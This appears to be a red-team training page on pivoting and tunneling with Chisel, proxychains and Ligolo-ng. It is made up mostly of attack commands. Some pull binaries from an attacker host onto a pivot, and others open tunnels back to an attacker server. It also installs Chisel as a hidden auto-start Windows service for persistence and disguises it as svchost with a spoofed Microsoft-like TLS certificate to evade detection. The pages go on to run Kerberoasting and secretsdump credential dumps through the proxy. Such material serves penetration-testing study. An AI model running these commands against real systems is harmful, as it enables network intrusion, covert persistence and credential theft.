---
layout: training-page
title: "Chisel & SOCKS5 — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - chisel
  - socks5
  - proxychains
  - reverse-pivot
page_key: "pivoting-chisel-socks"
render_with_liquid: false
---

# Chisel & SOCKS5

## Overview

Chisel is a fast TCP/UDP tunnel transported over HTTP, secured with SSH. It is purpose-built for penetration testing scenarios where you need SOCKS5 tunneling but SSH port forwarding is unavailable (no SSH server, no creds, or SSH forwarding disabled). A single Chisel binary acts as both server and client — drop it on the pivot and you have a full SOCKS5 proxy.

Chisel is written in Go and produces statically compiled binaries with no dependencies. Download pre-built releases or compile for your target architecture.

![Chisel reverse SOCKS5 tunnel: pivot client connects outbound over HTTP to attacker chisel server, creating SOCKS5 proxy on attacker port 1080 for access to internal network](/images/pivoting/chisel-socks-arch.svg)  
*// chisel reverse socks5 — pivot connects out, attacker proxychains in*

## Setup

```
# Download Chisel (Linux amd64):
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

# Windows version (transfer to pivot):
# chisel_1.9.1_windows_amd64.exe

# Transfer to pivot:
scp chisel ubuntu@10.129.202.64:/tmp/chisel
# Or via HTTP server:
python3 -m http.server 8000
# On pivot: wget http://10.10.14.5:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

## Standard SOCKS5 Forward Proxy

In the forward pivot, the Chisel server runs on your attack box. The pivot connects out to you and creates a SOCKS5 proxy accessible on your machine.

```
# ── Attack Box (Chisel SERVER) ────────────────────────────────
# Start Chisel server with reverse SOCKS5:
./chisel server -v -p 1234 --socks5
# -v: verbose
# -p 1234: listen on port 1234 for client connections
# --socks5: enable SOCKS5 proxy

# ── Pivot Host (Chisel CLIENT) ────────────────────────────────
# Connect to Chisel server and create SOCKS5 tunnel:
./chisel client -v 10.10.14.5:1234 socks
# This creates SOCKS5 proxy on attack box at 127.0.0.1:1080 (default)

# ── Back on Attack Box ────────────────────────────────────────
# Configure proxychains to use port 1080:
# /etc/proxychains.conf:
# socks5 127.0.0.1 1080

# Use any tool through the proxy:
proxychains nmap -sT -p 22,80,443,445,3389 172.16.5.0/24
proxychains evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'
```

## Reverse SOCKS5 Pivot

When your attack box cannot reach the pivot directly (e.g., NAT, firewall), run the Chisel server on the pivot and connect from your attack box. The SOCKS5 proxy is created on the pivot, traffic originates from there.

```
# ── Pivot Host (Chisel SERVER) ────────────────────────────────
./chisel server -v -p 1234 --socks5
# Pivot listens on port 1234

# ── Attack Box (Chisel CLIENT) ────────────────────────────────
./chisel client -v 10.129.202.64:1234 socks
# Creates SOCKS5 proxy on localhost:1080

# This is useful when:
# - Pivot is in a DMZ reachable from internet but can't reach you
# - Pivot has a public IP
# - You're routing through the pivot's network perspective
```

## Reverse Port Forward Through Chisel

Chisel's reverse flag lets the client define what ports to expose. Combined with `R:` syntax, you can create specific port forwards in addition to or instead of SOCKS5.

```
# ── Attack Box (Chisel SERVER with --reverse) ─────────────────
./chisel server -v -p 1234 --reverse

# ── Pivot Host (Chisel CLIENT) ────────────────────────────────
# Forward attack box port 2222 → internal host 172.16.5.19:22
./chisel client -v 10.10.14.5:1234 R:2222:172.16.5.19:22

# Forward multiple ports:
./chisel client -v 10.10.14.5:1234 R:3389:172.16.5.19:3389 R:445:172.16.5.19:445

# Combine SOCKS5 + specific port forwards:
./chisel client -v 10.10.14.5:1234 R:socks R:3389:172.16.5.19:3389
# R:socks creates reverse SOCKS5 on attack box at 127.0.0.1:1080

# On attack box — connect to the forwarded RDP:
xfreerdp /v:localhost:3389 /u:Administrator /p:'Password123!'
```

## Proxychains Configuration

Proxychains routes tool traffic through SOCKS proxies. Configure it to match the port Chisel exposes.

```
># /etc/proxychains.conf (or /etc/proxychains4.conf):

# Comment out any existing socks4/http lines
# Add your Chisel SOCKS5 listener:
socks5  127.0.0.1 1080

# For chaining through multiple pivots (double pivot):
socks5  127.0.0.1 1080    # first pivot (Chisel)
socks5  127.0.0.1 1081    # second pivot

# proxychains4 has better SOCKS5 support than proxychains3
# Check version:
proxychains -v 2>&1 | head -1

# Test connectivity through the proxy:
proxychains curl http://172.16.5.100
proxychains ping 172.16.5.19   # NOTE: proxychains doesn't proxy ICMP — use TCP scan

# Quiet mode (suppress proxychains output):
proxychains -q nmap -sT -p 80,443 172.16.5.100
```

## Chisel on Windows Pivot

Chisel runs natively on Windows. Transfer the Windows binary and execute from PowerShell or cmd.

```
# Transfer to Windows pivot:
# From attack box (Python HTTP server):
python3 -m http.server 8000
# On Windows pivot (PowerShell):
Invoke-WebRequest -Uri http://10.10.14.5:8000/chisel.exe -OutFile C:\Windows\Temp\chisel.exe

# Run Chisel client on Windows:
C:\Windows\Temp\chisel.exe client 10.10.14.5:1234 socks

# Hide the window (run via cmd):
cmd /c start /min C:\Windows\Temp\chisel.exe client 10.10.14.5:1234 socks

# As a service (for persistence — requires admin):
sc create chisel binPath= "C:\Windows\Temp\chisel.exe client 10.10.14.5:1234 socks" start= auto
net start chisel
```

## Double Pivot with Chisel

When the target network requires pivoting through two hosts, chain Chisel instances. Each pivot has its own Chisel client connecting to the next hop.

```
# Network: AttackBox → Pivot1 (10.129.202.64) → Pivot2 (172.16.5.19) → Target (192.168.1.10)

# Step 1: Attack box Chisel server
./chisel server -v -p 1234 --socks5

# Step 2: Pivot1 connects to attack box
./chisel client 10.10.14.5:1234 socks
# SOCKS5 on attack box at :1080 (reaches Pivot1's network)

# Step 3: Second Chisel server on Pivot1
./chisel server -v -p 2345 --socks5 &
# This server is accessible from Pivot2

# Step 4: From attack box via proxychains → connect Pivot2 to Pivot1
proxychains ./chisel client 172.16.5.19:2345 socks
# This creates SOCKS5 at :1081 on attack box (reaches Pivot2's network)

# /etc/proxychains.conf for double pivot:
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```

## Chisel with Authentication

Protect the Chisel server with a shared secret to prevent unauthorized connections to your pivot tunnel.

```
# ── Attack Box (Chisel SERVER with auth) ──────────────────────
./chisel server -v -p 1234 --socks5 --auth "user:SecretPass123"

# ── Pivot Host (Chisel CLIENT with auth) ──────────────────────
./chisel client -v --auth "user:SecretPass123" 10.10.14.5:1234 socks

# Auth with reverse mode:
./chisel server -v -p 1234 --reverse --auth "pivot:TunnelPass!"
./chisel client -v --auth "pivot:TunnelPass!" 10.10.14.5:1234 R:socks

# Multiple user credentials (server side) — use a credentials file:
# Create creds.json:
# {"user1":"pass1","user2":"pass2"}
./chisel server -v -p 1234 --socks5 --authfile /tmp/creds.json

# Why use auth:
# - Prevents other actors from connecting to your Chisel server
# - Critical if server is bound on 0.0.0.0 (internet-facing)
```

## Multiple Chisel Tunnels on the Same Server

Run multiple independent tunnels through one Chisel server by using separate listening ports or by having multiple clients connect simultaneously.

```
# One server, multiple clients connecting on different tunnel definitions:
# ── Attack Box ────────────────────────────────────────────────
./chisel server -v -p 1234 --socks5 --reverse
# This single server handles all clients

# ── Pivot1 (Linux) ────────────────────────────────────────────
./chisel client -v 10.10.14.5:1234 R:1080:socks
# Creates SOCKS5 at attack box :1080

# ── Pivot2 (Windows) ──────────────────────────────────────────
C:\Windows\Temp\chisel.exe client --auth user:pass 10.10.14.5:1234 R:1081:socks
# Creates SOCKS5 at attack box :1081

# ── Attack Box — configure proxychains per tunnel ─────────────
# /etc/proxychains4.conf for subnet reached via Pivot1:
# socks5 127.0.0.1 1080

# Use separate proxychains config files per pivot:
proxychains -f /etc/proxychains-pivot1.conf nmap -sT 172.16.5.0/24
proxychains -f /etc/proxychains-pivot2.conf nmap -sT 192.168.10.0/24

# Forward specific ports through named pivots:
./chisel client 10.10.14.5:1234 R:3389:172.16.5.19:3389 R:5985:172.16.5.19:5985
```

## Combining Chisel with Proxychains for Tool Routing

Chisel creates the SOCKS5 proxy; proxychains routes tools through it. Here is a practical workflow for a full assessment through a Chisel pivot.

```
# Step 1: Start Chisel on attack box
./chisel server -v -p 8080 --socks5

# Step 2: Upload and run Chisel client on pivot
scp chisel ubuntu@10.129.202.64:/tmp/
ssh ubuntu@10.129.202.64 "/tmp/chisel client 10.10.14.5:8080 socks &"

# Step 3: Set proxychains to use SOCKS5 on :1080
# /etc/proxychains4.conf:
# socks5  127.0.0.1  1080

# Step 4: Reconnaissance
proxychains nmap -sT -Pn -p 22,80,135,139,443,445,3389,5985 172.16.5.0/24

# Step 5: SMB enumeration
proxychains crackmapexec smb 172.16.5.0/24 --shares

# Step 6: WinRM access
proxychains evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'

# Step 7: Kerberos attacks (set proxychains + configure KDC routing)
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
    CORP/user:pass@172.16.5.19 -dc-ip 172.16.5.19 -request

# Step 8: Dump credentials via proxychains
proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    CORP/Administrator:'Password123!'@172.16.5.19
```

## Ligolo-ng — TUN Interface Pivoting

Ligolo-ng is a modern pivoting framework that creates a real TUN network interface on your attack box — meaning no proxychains, no SOCKS configuration. All tools work natively as if you're directly connected to the target subnet. It's faster and more reliable than SOCKS-based approaches for most tools.

```
# Download ligolo-ng (proxy = runs on attack box, agent = runs on pivot):
# https://github.com/nicocha30/ligolo-ng/releases
# Get: ligolo-ng_proxy_linux_amd64.tar.gz + ligolo-ng_agent_linux_amd64.tar.gz (or windows)

# ── Attack Box Setup ──────────────────────────────────────────
# Create TUN interface:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start ligolo proxy server (listens for agent connections):
./proxy -selfcert -laddr 0.0.0.0:11601
# -selfcert: generate self-signed cert
# -laddr: listen address for agents

# ── Pivot Host — start the agent ──────────────────────────────
# Linux:
./agent -connect 10.10.14.5:11601 -ignore-cert
# Windows:
.\agent.exe -connect 10.10.14.5:11601 -ignore-cert

# ── Back on Attack Box — configure the tunnel ─────────────────
# In the ligolo proxy console — select the agent session:
ligolo-ng » session
# Select the session number

# Add route for the internal network on your TUN interface:
sudo ip route add 172.16.5.0/24 dev ligolo

# Start the tunnel:
ligolo-ng » start

# Now tools work natively — no proxychains needed:
nmap -sV 172.16.5.19
evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'
crackmapexec smb 172.16.5.0/24

# Double pivot — add second agent through first pivot:
# On Pivot1 (already tunneled), run agent pointing to Pivot1's listener
# Add another TUN route for the second subnet:
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 192.168.1.0/24 dev ligolo2
```

## Chisel vs Ligolo-ng — When to Use Which

```
# Chisel:
# + Simpler setup (single binary, HTTP transport)
# + Works through web proxies (corporate HTTP CONNECT)
# + Good for quick SOCKS5 pivot
# - Requires proxychains for most tools
# - SOCKS has compatibility issues with some protocols (ICMP, UDP by default)

# Ligolo-ng:
# + No proxychains needed — TUN interface, native routing
# + Full network access (not limited by SOCKS compat)
# + Faster — no SOCKS overhead
# + Supports UDP tunneling
# - Requires root on attack box (to create TUN interface)
# - More complex initial setup
# - TLS required (even self-signed)

# Rule of thumb:
# → Quick pivot, HTTP proxy in path: Chisel
# → Full network access, want to run any tool directly: Ligolo-ng
# → SSH available: ssh -D or sshuttle (simpler)
```

## OPSEC: Chisel Traffic Patterns and TLS Wrapping

Chisel's default HTTP transport is detectable. Understanding its traffic signature and applying TLS improves evasion.

```
# Default Chisel traffic characteristics:
# - HTTP/1.1 POST requests to the server port
# - User-Agent header contains "Go-http-client" by default
# - Websocket upgrade headers (Upgrade: websocket, Connection: Upgrade)
# - High-frequency requests from the pivot host
# - Traffic to a non-standard high port (1234, 8080, etc.)

# Enable TLS on the Chisel server (reduces plaintext inspection):
./chisel server -v -p 443 --socks5 --tls-key /etc/ssl/private/server.key --tls-cert /etc/ssl/certs/server.crt

# Generate a self-signed cert:
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes \
    -subj "/C=US/O=Corp/CN=updates.microsoft-cdn.com"

# Client connects with TLS:
./chisel client -v --tls-skip-verify https://10.10.14.5:443 socks
# --tls-skip-verify: accept self-signed cert

# Use port 443 or 80 to blend with expected web traffic
# Use a hostname instead of IP when possible (requires DNS or /etc/hosts on pivot)
./chisel client -v https://attacker.example.com:443 socks

# OPSEC checklist for Chisel:
# - Use TLS (--tls-key/--tls-cert) to prevent plaintext inspection
# - Use port 443 or 80 rather than custom ports
# - Use --auth to prevent unauthorized connections
# - Rename the binary to something innocuous (svchost, update, etc.)
# - Remove the binary when tunneling is complete
# - Avoid running on monitored hosts with EDR that flags Go binaries
```

## Resources

- Chisel — https://github.com/jpillora/chisel
- Ligolo-ng — https://github.com/nicocha30/ligolo-ng
- proxychains-ng — https://github.com/rofl0r/proxychains-ng
- MITRE T1572 — Protocol Tunneling
- MITRE T1090 — Proxy
